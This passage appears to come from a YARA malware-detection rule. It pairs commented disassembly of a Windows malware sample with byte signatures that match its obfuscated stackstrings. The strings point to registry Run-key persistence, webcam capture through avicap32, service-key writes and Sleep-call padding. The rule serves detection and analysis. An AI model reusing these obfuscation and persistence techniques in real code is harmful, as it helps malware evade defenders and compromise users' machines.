        .text:0x00404d86  c644244043       mov byte [esp + 64],67
        .text:0x00404d8b  88542441         mov byte [esp + 65],dl
        .text:0x00404d8f  c64424426e       mov byte [esp + 66],110
        .text:0x00404d94  884c2444         mov byte [esp + 68],cl
        .text:0x00404d98  c644244561       mov byte [esp + 69],97
        .text:0x00404d9d  c64424466c       mov byte [esp + 70],108
        .text:0x00404da2  c644244750       mov byte [esp + 71],80
        .text:0x00404da7  884c2448         mov byte [esp + 72],cl
        .text:0x00404dab  c64424496f       mov byte [esp + 73],111
        .text:0x00404db0  c644244a63       mov byte [esp + 74],99
        .text:0x00404db5  8854244b         mov byte [esp + 75],dl
        .text:0x00404db9  c644244e6f       mov byte [esp + 78],111
        .text:0x00404dbe  884c244f         mov byte [esp + 79],cl
        .text:0x00404dc2  88442450         mov byte [esp + 80],al
        .text:0x00404dc6  c644245130       mov byte [esp + 81],48
        .text:0x00404dcb  885c2452         mov byte [esp + 82],bl
        .text:0x00404dcf  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00404dd1  8d442408         lea eax,dword [esp + 8]
        .text:0x00404dd5  8d4c2420         lea ecx,dword [esp + 32]
        .text:0x00404dd9  50               push eax
        .text:0x00404dda  51               push ecx
        .text:0x00404ddb  6802000080       push 0x80000002
        .text:0x00404de0  ff1520904000     call dword [0x00409020]    ;advapi32.RegOpenKeyA(0x80000002,local48,local72)
        .text:0x00404de6  53               push ebx
        .text:0x00404de7  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00404de9  c64424187e       mov byte [esp + 24],126
        .text:0x00404dee  c64424194d       mov byte [esp + 25],77
        .text:0x00404df3  c644241a48       mov byte [esp + 26],72
        .text:0x00404df8  c644241b7a       mov byte [esp + 27],122
        .text:0x00404dfd  885c241c         mov byte [esp + 28],bl
        .text:0x00404e01  53               push ebx
        .text:0x00404e02  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00404e04  8d54240c         lea edx,dword [esp + 12]
        .text:0x00404e08  8d442414         lea eax,dword [esp + 20]
        .text:0x00404e0c  52               push edx
        .text:0x00404e0d  8d4c2414         lea ecx,dword [esp + 20]
        .text:0x00404e11  50               push eax
        .text:0x00404e12  8b442410         mov eax,dword [esp + 16]
        .text:0x00404e16  51               push ecx
        .text:0x00404e17  8d542424         lea edx,dword [esp + 36]
        .text:0x00404e1b  53               push ebx
        .text:0x00404e1c  52               push edx
        .text:0x00404e1d  50               push eax
        .text:0x00404e1e  ff1508904000     call dword [0x00409008]    ;advapi32.RegQueryValueExA(0xfefefefe,local56,0,local64,local60,local68)
        .text:0x00404e24  53               push ebx
        .text:0x00404e25  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00404e27  8b4c2408         mov ecx,dword [esp + 8]
        .text:0x00404e2b  51               push ecx
        .text:0x00404e2c  ff150c904000     call dword [0x0040900c]    ;advapi32.RegCloseKey(0xfefefefe)
        .text:0x00404e32  53               push ebx
        .text:0x00404e33  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00404e35  8b442414         mov eax,dword [esp + 20]
        .text:0x00404e39  5e               pop esi
        .text:0x00404e3a  5b               pop ebx
        .text:0x00404e3b  83c448           add esp,72
        .text:0x00404e3e  c3               ret 
        */
        $c6 = { 83 EC 48 53 B3 44 B1 45 88 5C 24 ?? 88 5C 24 ?? 88 4C 24 ?? 88 4C 24 ?? B3 53 B8 04 00 00 00 B1 49 88 5C 24 ?? 88 5C 24 ?? 89 44 24 ?? 89 44 24 ?? 88 4C 24 ?? 88 4C 24 ?? B3 73 B0 41 B2 52 B1 74 88 5C 24 ?? 88 5C 24 ?? 88 5C 24 ?? 88 44 24 ?? 88 54 24 ?? 88 44 24 ?? 88 54 24 ?? 88 54 24 ?? 88 4C 24 ?? 88 4C 24 ?? 33 DB 56 8B 35 ?? ?? ?? ?? B0 5C B2 65 B1 72 53 C6 44 24 ?? 48 C6 44 24 ?? 57 88 44 24 ?? C6 44 24 ?? 43 C6 44 24 ?? 50 C6 44 24 ?? 54 C6 44 24 ?? 4F C6 44 24 ?? 4E 88 44 24 ?? C6 44 24 ?? 79 88 54 24 ?? C6 44 24 ?? 6D 88 44 24 ?? C6 44 24 ?? 43 88 54 24 ?? C6 44 24 ?? 6E 88 4C 24 ?? C6 44 24 ?? 61 C6 44 24 ?? 6C C6 44 24 ?? 50 88 4C 24 ?? C6 44 24 ?? 6F C6 44 24 ?? 63 88 54 24 ?? C6 44 24 ?? 6F 88 4C 24 ?? 88 44 24 ?? C6 44 24 ?? 30 88 5C 24 ?? FF D6 8D 44 24 ?? 8D 4C 24 ?? 50 51 68 02 00 00 80 FF 15 ?? ?? ?? ?? 53 FF D6 C6 44 24 ?? 7E C6 44 24 ?? 4D C6 44 24 ?? 48 C6 44 24 ?? 7A 88 5C 24 ?? 53 FF D6 8D 54 24 ?? 8D 44 24 ?? 52 8D 4C 24 ?? 50 8B 44 24 ?? 51 8D 54 24 ?? 53 52 50 FF 15 ?? ?? ?? ?? 53 FF D6 8B 4C 24 ?? 51 FF 15 ?? ?? ?? ?? 53 FF D6 8B 44 24 ?? 5E 5B 83 C4 48 C3 }
        /*
Basic Block at 0x00404e40@9324d1a8ae37a36ae560c37448c9705a with 1 features:
          - contain obfuscated stackstrings
        .text:0x00404e40  
        .text:0x00404e40  FUNC: int cdecl sub_00404e40( ) [2 XREFS] 
        .text:0x00404e40  
        .text:0x00404e40  Stack Variables: (offset from initial top of stack)
        .text:0x00404e40          -100: int local100
        .text:0x00404e40          -152: int local152
        .text:0x00404e40          -156: int local156
        .text:0x00404e40          -157: int local157
        .text:0x00404e40          -158: int local158
        .text:0x00404e40          -159: int local159
        .text:0x00404e40          -160: int local160
        .text:0x00404e40          -161: int local161
        .text:0x00404e40          -162: int local162
        .text:0x00404e40          -163: int local163
        .text:0x00404e40          -164: int local164
        .text:0x00404e40          -165: int local165
        .text:0x00404e40          -166: int local166
        .text:0x00404e40          -167: int local167
        .text:0x00404e40          -168: int local168
        .text:0x00404e40          -169: int local169
        .text:0x00404e40          -170: int local170
        .text:0x00404e40          -171: int local171
        .text:0x00404e40          -172: int local172
        .text:0x00404e40          -173: int local173
        .text:0x00404e40          -174: int local174
        .text:0x00404e40          -175: int local175
        .text:0x00404e40          -176: int local176
        .text:0x00404e40          -177: int local177
        .text:0x00404e40          -178: int local178
        .text:0x00404e40          -179: int local179
        .text:0x00404e40          -180: int local180
        .text:0x00404e40          -184: int local184
        .text:0x00404e40          -185: int local185
        .text:0x00404e40          -186: int local186
        .text:0x00404e40          -187: int local187
        .text:0x00404e40          -188: int local188
        .text:0x00404e40          -189: int local189
        .text:0x00404e40          -190: int local190
        .text:0x00404e40          -191: int local191
        .text:0x00404e40          -192: int local192
        .text:0x00404e40          -193: int local193
        .text:0x00404e40          -194: int local194
        .text:0x00404e40          -195: int local195
        .text:0x00404e40          -196: int local196
        .text:0x00404e40  
        .text:0x00404e40  81ecc4000000     sub esp,196
        .text:0x00404e46  53               push ebx
        .text:0x00404e47  55               push ebp
        .text:0x00404e48  8b2d78904000     mov ebp,dword [0x00409078]
        .text:0x00404e4e  56               push esi
        .text:0x00404e4f  b06c             mov al,108
        .text:0x00404e51  57               push edi
        .text:0x00404e52  33ff             xor edi,edi
        .text:0x00404e54  8844241a         mov byte [esp + 26],al
        .text:0x00404e58  8844241b         mov byte [esp + 27],al
        .text:0x00404e5c  b341             mov bl,65
        .text:0x00404e5e  b265             mov dl,101
        .text:0x00404e60  b172             mov cl,114
        .text:0x00404e62  b069             mov al,105
        .text:0x00404e64  57               push edi
        .text:0x00404e65  885c2414         mov byte [esp + 20],bl
        .text:0x00404e69  c644241556       mov byte [esp + 21],86
        .text:0x00404e6e  c644241649       mov byte [esp + 22],73
        .text:0x00404e73  c644241743       mov byte [esp + 23],67
        .text:0x00404e78  885c2418         mov byte [esp + 24],bl
        .text:0x00404e7c  c644241950       mov byte [esp + 25],80
        .text:0x00404e81  c644241a33       mov byte [esp + 26],51
        .text:0x00404e86  c644241b32       mov byte [esp + 27],50
        .text:0x00404e8b  c644241c2e       mov byte [esp + 28],46
        .text:0x00404e90  c644241d64       mov byte [esp + 29],100
        .text:0x00404e95  c644242000       mov byte [esp + 32],0
        .text:0x00404e9a  c644242463       mov byte [esp + 36],99
        .text:0x00404e9f  c644242561       mov byte [esp + 37],97
        .text:0x00404ea4  c644242670       mov byte [esp + 38],112
        .text:0x00404ea9  c644242747       mov byte [esp + 39],71
        .text:0x00404eae  88542428         mov byte [esp + 40],dl
        .text:0x00404eb2  c644242974       mov byte [esp + 41],116
        .text:0x00404eb7  c644242a44       mov byte [esp + 42],68
        .text:0x00404ebc  884c242b         mov byte [esp + 43],cl
        .text:0x00404ec0  8844242c         mov byte [esp + 44],al
        .text:0x00404ec4  c644242d76       mov byte [esp + 45],118
        .text:0x00404ec9  8854242e         mov byte [esp + 46],dl
        .text:0x00404ecd  884c242f         mov byte [esp + 47],cl
        .text:0x00404ed1  c644243044       mov byte [esp + 48],68
        .text:0x00404ed6  88542431         mov byte [esp + 49],dl
        .text:0x00404eda  c644243273       mov byte [esp + 50],115
        .text:0x00404edf  c644243363       mov byte [esp + 51],99
        .text:0x00404ee4  884c2434         mov byte [esp + 52],cl
        .text:0x00404ee8  88442435         mov byte [esp + 53],al
        .text:0x00404eec  c644243670       mov byte [esp + 54],112
        .text:0x00404ef1  c644243774       mov byte [esp + 55],116
        .text:0x00404ef6  88442438         mov byte [esp + 56],al
        .text:0x00404efa  c64424396f       mov byte [esp + 57],111
        .text:0x00404eff  c644243a6e       mov byte [esp + 58],110
        .text:0x00404f04  885c243b         mov byte [esp + 59],bl
        .text:0x00404f08  c644243c00       mov byte [esp + 60],0
        .text:0x00404f0d  ffd5             call ebp    ;kernel32.Sleep(0)
        .text:0x00404f0f  8d442420         lea eax,dword [esp + 32]
        .text:0x00404f13  8d4c2410         lea ecx,dword [esp + 16]
        .text:0x00404f17  50               push eax
        .text:0x00404f18  51               push ecx
        .text:0x00404f19  ff15ec904000     call dword [0x004090ec]    ;kernel32.LoadLibraryA(local196)
        .text:0x00404f1f  50               push eax
        .text:0x00404f20  ff15e8904000     call dword [0x004090e8]    ;kernel32.GetProcAddress(avicap32,local180)
        .text:0x00404f26  8bd8             mov ebx,eax
        .text:0x00404f28  33f6             xor esi,esi
        */
        $c7 = { 81 EC C4 00 00 00 53 55 8B 2D ?? ?? ?? ?? 56 B0 6C 57 33 FF 88 44 24 ?? 88 44 24 ?? B3 41 B2 65 B1 72 B0 69 57 88 5C 24 ?? C6 44 24 ?? 56 C6 44 24 ?? 49 C6 44 24 ?? 43 88 5C 24 ?? C6 44 24 ?? 50 C6 44 24 ?? 33 C6 44 24 ?? 32 C6 44 24 ?? 2E C6 44 24 ?? 64 C6 44 24 ?? 00 C6 44 24 ?? 63 C6 44 24 ?? 61 C6 44 24 ?? 70 C6 44 24 ?? 47 88 54 24 ?? C6 44 24 ?? 74 C6 44 24 ?? 44 88 4C 24 ?? 88 44 24 ?? C6 44 24 ?? 76 88 54 24 ?? 88 4C 24 ?? C6 44 24 ?? 44 88 54 24 ?? C6 44 24 ?? 73 C6 44 24 ?? 63 88 4C 24 ?? 88 44 24 ?? C6 44 24 ?? 70 C6 44 24 ?? 74 88 44 24 ?? C6 44 24 ?? 6F C6 44 24 ?? 6E 88 5C 24 ?? C6 44 24 ?? 00 FF D5 8D 44 24 ?? 8D 4C 24 ?? 50 51 FF 15 ?? ?? ?? ?? 50 FF 15 ?? ?? ?? ?? 8B D8 33 F6 }
        /*
Basic Block at 0x00404f60@9324d1a8ae37a36ae560c37448c9705a with 1 features:
          - contain obfuscated stackstrings
        .text:0x00404f60  
        .text:0x00404f60  FUNC: int cdecl sub_00404f60( int arg0, int arg1, int arg2, int arg3, ) [8 XREFS] 
        .text:0x00404f60  
        .text:0x00404f60  Stack Variables: (offset from initial top of stack)
        .text:0x00404f60            16: int arg3
        .text:0x00404f60            12: int arg2
        .text:0x00404f60             8: int arg1
        .text:0x00404f60             4: int arg0
        .text:0x00404f60          -1023: int local1023
        .text:0x00404f60          -1024: int local1024
        .text:0x00404f60          -1028: int local1028
        .text:0x00404f60          -1029: int local1029
        .text:0x00404f60          -1030: int local1030
        .text:0x00404f60          -1031: int local1031
        .text:0x00404f60          -1032: int local1032
        .text:0x00404f60          -1033: int local1033
        .text:0x00404f60          -1034: int local1034
        .text:0x00404f60          -1035: int local1035
        .text:0x00404f60          -1036: int local1036
        .text:0x00404f60          -1037: int local1037
        .text:0x00404f60          -1038: int local1038
        .text:0x00404f60          -1039: int local1039
        .text:0x00404f60          -1040: int local1040
        .text:0x00404f60          -1041: int local1041
        .text:0x00404f60          -1042: int local1042
        .text:0x00404f60          -1043: int local1043
        .text:0x00404f60          -1044: int local1044
        .text:0x00404f60          -1045: int local1045
        .text:0x00404f60          -1046: int local1046
        .text:0x00404f60          -1047: int local1047
        .text:0x00404f60          -1048: int local1048
        .text:0x00404f60          -1049: int local1049
        .text:0x00404f60          -1050: int local1050
        .text:0x00404f60          -1051: int local1051
        .text:0x00404f60          -1052: int local1052
        .text:0x00404f60          -1053: int local1053
        .text:0x00404f60          -1054: int local1054
        .text:0x00404f60          -1055: int local1055
        .text:0x00404f60          -1056: int local1056
        .text:0x00404f60          -1057: int local1057
        .text:0x00404f60          -1058: int local1058
        .text:0x00404f60          -1059: int local1059
        .text:0x00404f60          -1060: int local1060
        .text:0x00404f60          -1061: int local1061
        .text:0x00404f60          -1062: int local1062
        .text:0x00404f60          -1063: int local1063
        .text:0x00404f60          -1064: int local1064
        .text:0x00404f60  
        .text:0x00404f60  81ec28040000     sub esp,1064
        .text:0x00404f66  53               push ebx
        .text:0x00404f67  55               push ebp
        .text:0x00404f68  56               push esi
        .text:0x00404f69  8b3578904000     mov esi,dword [0x00409078]
        .text:0x00404f6f  57               push edi
        .text:0x00404f70  6a00             push 0
        .text:0x00404f72  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00404f74  6a00             push 0
        .text:0x00404f76  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00404f78  b9ff000000       mov ecx,255
        .text:0x00404f7d  33c0             xor eax,eax
        .text:0x00404f7f  8d7c2439         lea edi,dword [esp + 57]
        .text:0x00404f83  c644243800       mov byte [esp + 56],0
        .text:0x00404f88  f3ab             rep: stosd 
        .text:0x00404f8a  66ab             stosd 
        .text:0x00404f8c  6a00             push 0
        .text:0x00404f8e  aa               stosb 
        .text:0x00404f8f  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00404f91  6a00             push 0
        .text:0x00404f93  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00404f95  6a00             push 0
        .text:0x00404f97  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00404f99  8bac2448040000   mov ebp,dword [esp + 1096]
        .text:0x00404fa0  8b9c2444040000   mov ebx,dword [esp + 1092]
        .text:0x00404fa7  8bcd             mov ecx,ebp
        .text:0x00404fa9  33c0             xor eax,eax
        .text:0x00404fab  8bd1             mov edx,ecx
        .text:0x00404fad  8bfb             mov edi,ebx
        .text:0x00404faf  c1e902           shr ecx,2
        .text:0x00404fb2  f3ab             rep: stosd 
        .text:0x00404fb4  8bca             mov ecx,edx
        .text:0x00404fb6  6a00             push 0
        .text:0x00404fb8  83e103           and ecx,3
        .text:0x00404fbb  f3aa             rep: stosb 
        .text:0x00404fbd  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00404fbf  b900010000       mov ecx,256
        .text:0x00404fc4  33c0             xor eax,eax
        .text:0x00404fc6  8d7c2438         lea edi,dword [esp + 56]
        .text:0x00404fca  50               push eax
        .text:0x00404fcb  f3ab             rep: stosd 
        .text:0x00404fcd  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00404fcf  b065             mov al,101
        .text:0x00404fd1  b253             mov dl,83
        .text:0x00404fd3  8844241b         mov byte [esp + 27],al
        .text:0x00404fd7  88442426         mov byte [esp + 38],al
        .text:0x00404fdb  8844242a         mov byte [esp + 42],al
        .text:0x00404fdf  8844242f         mov byte [esp + 47],al
        .text:0x00404fe3  b172             mov cl,114
        .text:0x00404fe5  b073             mov al,115
        .text:0x00404fe7  88542410         mov byte [esp + 16],dl
        .text:0x00404feb  c644241159       mov byte [esp + 17],89
        .text:0x00404ff0  88542412         mov byte [esp + 18],dl
        .text:0x00404ff4  c644241354       mov byte [esp + 19],84
        .text:0x00404ff9  c644241445       mov byte [esp + 20],69
        .text:0x00404ffe  c64424154d       mov byte [esp + 21],77
        .text:0x00405003  c64424165c       mov byte [esp + 22],92
        .text:0x00405008  c644241743       mov byte [esp + 23],67
        .text:0x0040500d  c644241875       mov byte [esp + 24],117
        .text:0x00405012  884c2419         mov byte [esp + 25],cl
        .text:0x00405016  884c241a         mov byte [esp + 26],cl
        .text:0x0040501a  c644241c6e       mov byte [esp + 28],110
        .text:0x0040501f  c644241d74       mov byte [esp + 29],116
        .text:0x00405024  c644241e43       mov byte [esp + 30],67
        .text:0x00405029  c644241f6f       mov byte [esp + 31],111
        .text:0x0040502e  c64424206e       mov byte [esp + 32],110
        .text:0x00405033  c644242174       mov byte [esp + 33],116
        .text:0x00405038  884c2422         mov byte [esp + 34],cl
        .text:0x0040503c  c64424236f       mov byte [esp + 35],111
        .text:0x00405041  c64424246c       mov byte [esp + 36],108
        .text:0x00405046  88542425         mov byte [esp + 37],dl
        .text:0x0040504a  c644242774       mov byte [esp + 39],116
        .text:0x0040504f  c64424285c       mov byte [esp + 40],92
        .text:0x00405054  88542429         mov byte [esp + 41],dl
        .text:0x00405058  884c242b         mov byte [esp + 43],cl
        .text:0x0040505c  c644242c76       mov byte [esp + 44],118
        .text:0x00405061  c644242d69       mov byte [esp + 45],105
        .text:0x00405066  c644242e63       mov byte [esp + 46],99
        .text:0x0040506b  88442430         mov byte [esp + 48],al
        .text:0x0040506f  c64424315c       mov byte [esp + 49],92
        .text:0x00405074  c644243225       mov byte [esp + 50],37
        .text:0x00405079  88442433         mov byte [esp + 51],al
        .text:0x0040507d  6a00             push 0
        .text:0x0040507f  c644243800       mov byte [esp + 56],0
        .text:0x00405084  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00405086  6a00             push 0
        .text:0x00405088  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x0040508a  6a00             push 0
        .text:0x0040508c  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x0040508e  6a00             push 0
        .text:0x00405090  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00405092  6a00             push 0
        .text:0x00405094  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00405096  8b84243c040000   mov eax,dword [esp + 1084]
        .text:0x0040509d  8d4c2410         lea ecx,dword [esp + 16]
        .text:0x004050a1  50               push eax
        .text:0x004050a2  8d54243c         lea edx,dword [esp + 60]
        .text:0x004050a6  51               push ecx
        .text:0x004050a7  52               push edx
        .text:0x004050a8  ff15d8914000     call dword [0x004091d8]    ;user32.wsprintfA(local1024,local1064)
        .text:0x004050ae  83c40c           add esp,12
        .text:0x004050b1  6a00             push 0
        .text:0x004050b3  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004050b5  6a00             push 0
        .text:0x004050b7  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004050b9  8b842440040000   mov eax,dword [esp + 1088]
        .text:0x004050c0  6a00             push 0
        .text:0x004050c2  55               push ebp
        .text:0x004050c3  6a00             push 0
        .text:0x004050c5  53               push ebx
        .text:0x004050c6  6a01             push 1
        .text:0x004050c8  8d4c244c         lea ecx,dword [esp + 76]
        .text:0x004050cc  50               push eax
        .text:0x004050cd  51               push ecx
        .text:0x004050ce  6802000080       push 0x80000002
        .text:0x004050d3  e8b8f9ffff       call 0x00404a90    ;sub_00404a90(0x80000002,local1024,arg1,1,arg2,0,arg3,0)
        .text:0x004050d8  83c420           add esp,32
        .text:0x004050db  6a00             push 0
        .text:0x004050dd  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004050df  5f               pop edi
        .text:0x004050e0  5e               pop esi
        .text:0x004050e1  5d               pop ebp
        .text:0x004050e2  5b               pop ebx
        .text:0x004050e3  81c428040000     add esp,1064
        .text:0x004050e9  c3               ret 
        */
        $c8 = { 81 EC 28 04 00 00 53 55 56 8B 35 ?? ?? ?? ?? 57 6A 00 FF D6 6A 00 FF D6 B9 FF 00 00 00 33 C0 8D 7C 24 ?? C6 44 24 ?? 00 F3 AB 66 AB 6A 00 AA FF D6 6A 00 FF D6 6A 00 FF D6 8B AC 24 ?? ?? ?? ?? 8B 9C 24 ?? ?? ?? ?? 8B CD 33 C0 8B D1 8B FB C1 E9 02 F3 AB 8B CA 6A 00 83 E1 03 F3 AA FF D6 B9 00 01 00 00 33 C0 8D 7C 24 ?? 50 F3 AB FF D6 B0 65 B2 53 88 44 24 ?? 88 44 24 ?? 88 44 24 ?? 88 44 24 ?? B1 72 B0 73 88 54 24 ?? C6 44 24 ?? 59 88 54 24 ?? C6 44 24 ?? 54 C6 44 24 ?? 45 C6 44 24 ?? 4D C6 44 24 ?? 5C C6 44 24 ?? 43 C6 44 24 ?? 75 88 4C 24 ?? 88 4C 24 ?? C6 44 24 ?? 6E C6 44 24 ?? 74 C6 44 24 ?? 43 C6 44 24 ?? 6F C6 44 24 ?? 6E C6 44 24 ?? 74 88 4C 24 ?? C6 44 24 ?? 6F C6 44 24 ?? 6C 88 54 24 ?? C6 44 24 ?? 74 C6 44 24 ?? 5C 88 54 24 ?? 88 4C 24 ?? C6 44 24 ?? 76 C6 44 24 ?? 69 C6 44 24 ?? 63 88 44 24 ?? C6 44 24 ?? 5C C6 44 24 ?? 25 88 44 24 ?? 6A 00 C6 44 24 ?? 00 FF D6 6A 00 FF D6 6A 00 FF D6 6A 00 FF D6 6A 00 FF D6 8B 84 24 ?? ?? ?? ?? 8D 4C 24 ?? 50 8D 54 24 ?? 51 52 FF 15 ?? ?? ?? ?? 83 C4 0C 6A 00 FF D6 6A 00 FF D6 8B 84 24 ?? ?? ?? ?? 6A 00 55 6A 00 53 6A 01 8D 4C 24 ?? 50 51 68 02 00 00 80 E8 ?? ?? ?? ?? 83 C4 20 6A 00 FF D6 5F 5E 5D 5B 81 C4 28 04 00 00 C3 }
        /*
Basic Block at 0x004056e0@9324d1a8ae37a36ae560c37448c9705a with 1 features:
          - contain obfuscated stackstrings
        .text:0x004056e0  
        .text:0x004056e0  FUNC: int cdecl sub_004056e0( int arg0, int arg1, ) [2 XREFS] 
        .text:0x004056e0  
        .text:0x004056e0  Stack Variables: (offset from initial top of stack)
        .text:0x004056e0             8: int arg1
        .text:0x004056e0             4: int arg0
        .text:0x004056e0            -3: int local3
        .text:0x004056e0            -4: int local4
        .text:0x004056e0            -5: int local5
        .text:0x004056e0            -6: int local6
        .text:0x004056e0            -7: int local7
        .text:0x004056e0            -8: int local8
        .text:0x004056e0            -9: int local9
        .text:0x004056e0           -10: int local10
        .text:0x004056e0           -11: int local11
        .text:0x004056e0           -12: int local12
        .text:0x004056e0           -13: int local13
        .text:0x004056e0           -14: int local14
        .text:0x004056e0           -15: int local15
        .text:0x004056e0           -16: int local16
        .text:0x004056e0           -17: int local17
        .text:0x004056e0           -18: int local18
        .text:0x004056e0           -19: int local19
        .text:0x004056e0           -20: int local20
        .text:0x004056e0           -21: int local21
        .text:0x004056e0           -22: int local22
        .text:0x004056e0           -23: int local23
        .text:0x004056e0           -24: int local24
        .text:0x004056e0           -25: int local25
        .text:0x004056e0           -26: int local26
        .text:0x004056e0           -27: int local27
        .text:0x004056e0           -28: int local28
        .text:0x004056e0           -29: int local29
        .text:0x004056e0           -30: int local30
        .text:0x004056e0           -31: int local31
        .text:0x004056e0           -32: int local32
        .text:0x004056e0           -33: int local33
        .text:0x004056e0           -34: int local34
        .text:0x004056e0           -35: int local35
        .text:0x004056e0           -36: int local36
        .text:0x004056e0           -37: int local37
        .text:0x004056e0           -38: int local38
        .text:0x004056e0           -39: int local39
        .text:0x004056e0           -40: int local40
        .text:0x004056e0           -41: int local41
        .text:0x004056e0           -42: int local42
        .text:0x004056e0           -43: int local43
        .text:0x004056e0           -44: int local44
        .text:0x004056e0           -45: int local45
        .text:0x004056e0           -46: int local46
        .text:0x004056e0           -47: int local47
        .text:0x004056e0           -48: int local48
        .text:0x004056e0  
        .text:0x004056e0  83ec30           sub esp,48
        .text:0x004056e3  53               push ebx
        .text:0x004056e4  b057             mov al,87
        .text:0x004056e6  56               push esi
        .text:0x004056e7  8b742440         mov esi,dword [esp + 64]
        .text:0x004056eb  b16f             mov cl,111
        .text:0x004056ed  8844240c         mov byte [esp + 12],al
        .text:0x004056f1  8844241b         mov byte [esp + 27],al
        .text:0x004056f5  b35c             mov bl,92
        .text:0x004056f7  b272             mov dl,114
        .text:0x004056f9  884c2415         mov byte [esp + 21],cl
        .text:0x004056fd  884c2417         mov byte [esp + 23],cl
        .text:0x00405701  b06e             mov al,110
        .text:0x00405703  884c241f         mov byte [esp + 31],cl
        .text:0x00405707  884c242f         mov byte [esp + 47],cl
        .text:0x0040570b  8b0dd4aa4000     mov ecx,dword [0x0040aad4]
        .text:0x00405711  6a00             push 0
        .text:0x00405713  56               push esi
        .text:0x00405714  c644241053       mov byte [esp + 16],83
        .text:0x00405719  c64424114f       mov byte [esp + 17],79
        .text:0x0040571e  c644241246       mov byte [esp + 18],70
        .text:0x00405723  c644241354       mov byte [esp + 19],84
        .text:0x00405728  c644241541       mov byte [esp + 21],65
        .text:0x0040572d  c644241652       mov byte [esp + 22],82
        .text:0x00405732  c644241745       mov byte [esp + 23],69
        .text:0x00405737  885c2418         mov byte [esp + 24],bl
        .text:0x0040573b  c64424194d       mov byte [esp + 25],77
        .text:0x00405740  c644241a69       mov byte [esp + 26],105
        .text:0x00405745  c644241b63       mov byte [esp + 27],99
        .text:0x0040574a  8854241c         mov byte [esp + 28],dl
        .text:0x0040574e  c644241e73       mov byte [esp + 30],115
        .text:0x00405753  c644242066       mov byte [esp + 32],102
        .text:0x00405758  c644242174       mov byte [esp + 33],116
        .text:0x0040575d  885c2422         mov byte [esp + 34],bl
        .text:0x00405761  c644242469       mov byte [esp + 36],105
        .text:0x00405766  88442425         mov byte [esp + 37],al
        .text:0x0040576a  c644242664       mov byte [esp + 38],100
        .text:0x0040576f  c644242877       mov byte [esp + 40],119
        .text:0x00405774  c644242973       mov byte [esp + 41],115
        .text:0x00405779  885c242a         mov byte [esp + 42],bl
        .text:0x0040577d  c644242b43       mov byte [esp + 43],67
        .text:0x00405782  c644242c75       mov byte [esp + 44],117
        .text:0x00405787  8854242d         mov byte [esp + 45],dl
        .text:0x0040578b  8854242e         mov byte [esp + 46],dl
        .text:0x0040578f  c644242f65       mov byte [esp + 47],101
        .text:0x00405794  88442430         mov byte [esp + 48],al
        .text:0x00405798  c644243174       mov byte [esp + 49],116
        .text:0x0040579d  c644243256       mov byte [esp + 50],86
        .text:0x004057a2  c644243365       mov byte [esp + 51],101
        .text:0x004057a7  88542434         mov byte [esp + 52],dl
        .text:0x004057ab  c644243573       mov byte [esp + 53],115
        .text:0x004057b0  c644243669       mov byte [esp + 54],105
        .text:0x004057b5  88442438         mov byte [esp + 56],al
        .text:0x004057b9  885c2439         mov byte [esp + 57],bl
        .text:0x004057bd  c644243a52       mov byte [esp + 58],82
        .text:0x004057c2  c644243b75       mov byte [esp + 59],117
        .text:0x004057c7  8844243c         mov byte [esp + 60],al
        .text:0x004057cb  c644243d00       mov byte [esp + 61],0
        .text:0x004057d0  e81befffff       call 0x004046f0    ;sub_004046f0(arg1)
        .text:0x004057d5  50               push eax
        .text:0x004057d6  56               push esi
        .text:0x004057d7  6a01             push 1
        .text:0x004057d9  8d442418         lea eax,dword [esp + 24]
        .text:0x004057dd  68f6a44000       push 0x0040a4f6
        .text:0x004057e2  50               push eax
        .text:0x004057e3  6802000080       push 0x80000002
        .text:0x004057e8  e8f3f3ffff       call 0x00404be0    ;sub_00404be0(0x80000002,local48,0x0040a4f6,1,arg1,sub_004046f0(arg1),0)
        .text:0x004057ed  83c41c           add esp,28
        .text:0x004057f0  33c0             xor eax,eax
        .text:0x004057f2  5e               pop esi
        .text:0x004057f3  5b               pop ebx
        .text:0x004057f4  83c430           add esp,48
        .text:0x004057f7  c3               ret 
        */
        $c9 = { 83 EC 30 53 B0 57 56 8B 74 24 ?? B1 6F 88 44 24 ?? 88 44 24 ?? B3 5C B2 72 88 4C 24 ?? 88 4C 24 ?? B0 6E 88 4C 24 ?? 88 4C 24 ?? 8B 0D ?? ?? ?? ?? 6A 00 56 C6 44 24 ?? 53 C6 44 24 ?? 4F C6 44 24 ?? 46 C6 44 24 ?? 54 C6 44 24 ?? 41 C6 44 24 ?? 52 C6 44 24 ?? 45 88 5C 24 ?? C6 44 24 ?? 4D C6 44 24 ?? 69 C6 44 24 ?? 63 88 54 24 ?? C6 44 24 ?? 73 C6 44 24 ?? 66 C6 44 24 ?? 74 88 5C 24 ?? C6 44 24 ?? 69 88 44 24 ?? C6 44 24 ?? 64 C6 44 24 ?? 77 C6 44 24 ?? 73 88 5C 24 ?? C6 44 24 ?? 43 C6 44 24 ?? 75 88 54 24 ?? 88 54 24 ?? C6 44 24 ?? 65 88 44 24 ?? C6 44 24 ?? 74 C6 44 24 ?? 56 C6 44 24 ?? 65 88 54 24 ?? C6 44 24 ?? 73 C6 44 24 ?? 69 88 44 24 ?? 88 5C 24 ?? C6 44 24 ?? 52 C6 44 24 ?? 75 88 44 24 ?? C6 44 24 ?? 00 E8 ?? ?? ?? ?? 50 56 6A 01 8D 44 24 ?? 68 F6 A4 40 00 50 68 02 00 00 80 E8 ?? ?? ?? ?? 83 C4 1C 33 C0 5E 5B 83 C4 30 C3 }
